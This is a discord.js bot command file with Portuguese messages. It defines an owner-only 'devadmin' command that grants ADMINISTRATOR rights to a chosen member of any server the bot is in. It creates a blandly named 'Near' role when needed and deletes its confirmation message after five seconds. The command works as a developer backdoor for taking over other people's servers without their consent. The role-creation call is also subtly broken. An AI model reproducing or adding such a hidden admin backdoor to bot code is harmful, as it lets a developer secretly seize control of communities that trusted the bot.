const Discord = require('discord.js');

exports.run = async (bot, message, args, settings) => {
    if (!bot.owners.includes(message.author.id)) return message.channel.send('Apenas o desenvolvedor pode usar esse comando.');
    let toadm = message.mentions.members.first() || message.guild.members.cache.find(u => u.user.id === args[0]) || message.guild.members.cache.find(u => u.user.username === args[0]) || message.guild.members.cache.find(u => `${u.user.username}#${u.user.discriminator}` === args[0]);
    if (!message.guild.me.permissions.has("ADMINISTRATOR")) return message.channel.send("Uhh parece que eu não tenho permissões suficientes :/");
    let admrole = message.guild.roles.cache.find(r => r.name == "Near");
    if (!admrole) {
      try {
        admrole = await message.guild.roles.cache.create ({
          data: {
            name: "Near",
            color: "#8a00ff",
            permissions: ["ADMINISTRATOR"]
          },
        });
      } catch (e) {
        console.log(e.stack);
      }
    }
    await(toadm.roles.add(admrole));
    message.channel.send(`Dev Admin foi adicionado para <@${toadm.id}>.`).then(msg => msg.delete({ timeout: 5000 }));

};

exports.command = {
  aliases: [],
  description: "Adiciona Administrador para um usuário, caso o bot tenha permissões suficientes.",
  usage: "devadmin <usuário>",
  commandPermissions: ['DEVELOPER'],
  commandCategory: {
      administration: false,
      information: false,
      economy: false,
      util: false,
      music: false,
      development: true
  },
  disabled: false
};